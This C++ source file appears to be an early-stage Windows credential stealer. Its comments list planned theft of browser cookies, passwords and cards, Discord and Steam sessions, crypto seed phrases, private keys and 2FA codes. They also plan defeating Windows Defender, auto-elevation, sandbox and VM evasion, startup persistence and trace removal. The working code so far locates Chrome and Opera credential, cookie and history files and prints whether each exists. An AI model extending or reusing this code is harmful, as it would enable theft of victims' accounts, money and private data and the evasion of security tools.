#include <unordered_map>
#include <string>
#include <fstream>
#include <vector>
#include <iostream>
#include <windows.h>

using namespace std;

// TO ADD
// 1. Checking browsers
// 2. Checking for Discord, Slack
// 3. Checking for Antiviruses
// 4. Check for saved 2FA codes
// 5. Add exclusion to win defender
// 6. Auto Elevate (with saving reg)
// 7. Steal sessions from (Steam eg.)
// 8. VM Detection
// 9. If launched in VM, implode and bluescreen

/*
=== Discord Information ===

Nitro
Badges
Billing
Email
Phone
HQ Friends
HQ Guilds
Gift Codes

=== Browser Data ===

Cookies
Passwords
Histories
Autofills
Bookmarks
Credit/Debit Cards
From Chrome, Edge, Brave, Opera GX, and many more...

=== Application Data ===

Steam
Riot Games
Telegram

=== System Information ===

User
System
Disk
Network

=== File Stealer ===

Grabs Seed Phrases, Tokens, Private Keys, Recovery Codes, Backup Codes, 2FA codes

=== General Functions ===

Check if being run in a VirusTotal sandbox
Adds file to startup


 */
/*

MORE IDEAS:

 - reverse version that unstoles data (maybe)
 - one use only (After use it deletes the webhook and the file leaving no trace)
 - useful mode (Not steals but gives important info like passwords, 2fa codes, etc)

 */

string status = "Beta";
double version = 0.1;

unordered_map<string, vector<string>> known_browser_paths = {
    {
        "Chrome", {
            R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\History)",
            R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data)",
            R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies)",
            R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\History)",
            R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\Login Data)",
            R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\Network\Cookies)",
            R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\History)",
            R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\Login Data)",
            R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\Network\Cookies)",
            R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\History)",
            R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\Login Data)",
            R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\Network\Cookies)",
            R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\History)",
            R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\Login Data)",
            R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\Network\Cookies)",
            R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\History)",
            R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\Login Data)",
            R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\Network\Cookies)",
        }
    },
    {
        "Opera", {
            R"(%APPDATA%\Opera Software\Opera GX Stable\History)",
            R"(%APPDATA%\Opera Software\Opera GX Stable\Login Data)",
            R"(%APPDATA%\Opera Software\Opera GX Stable\Network\Cookies)",
            R"(%APPDATA%\Opera Software\Opera Stable\History)",
            R"(%APPDATA%\Opera Software\Opera Stable\Login Data)",
            R"(%APPDATA%\Opera Software\Opera Stable\Network\Cookies)",
            R"(%APPDATA%\Opera Software\Opera Neon\User Data\Default\History)",
            R"(%APPDATA%\Opera Software\Opera Neon\User Data\Default\Login Data)",
            R"(%APPDATA%\Opera Software\Opera Neon\User Data\Default\Network\Cookies)",
    }},
};

enum Browsers {
    Chrome,
    Opera,
    Edge,
    Brave,
    Firefox,
};

bool fileExists(const string& filePath) {
    DWORD dwAttrib = GetFileAttributesA(filePath.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

string expandEnvironmentVariables(const string& path) {
    char buffer[MAX_PATH];
    ExpandEnvironmentStringsA(path.c_str(), buffer, sizeof(buffer));
    return buffer;
}

void checkBrowserPaths(const string& browserName) {
    for (const string& path : known_browser_paths[browserName]) {
        string expandedPath = expandEnvironmentVariables(path);
        if (fileExists(expandedPath)) {
            cout << "OK | File exists: " << expandedPath << endl;
        } else {
            cout << "NOT FOUND | File does not exist: " << expandedPath << endl;
        }
    }
}


void LocateBrowsers() {
    cout << "start" << endl;
    for (const auto& [browserName, paths] : known_browser_paths) {
        checkBrowserPaths(browserName);
    }
    cout << "end" << endl;
}

int main() {
    cout << "hi!" << endl;
     LocateBrowsers();
    return 0;
}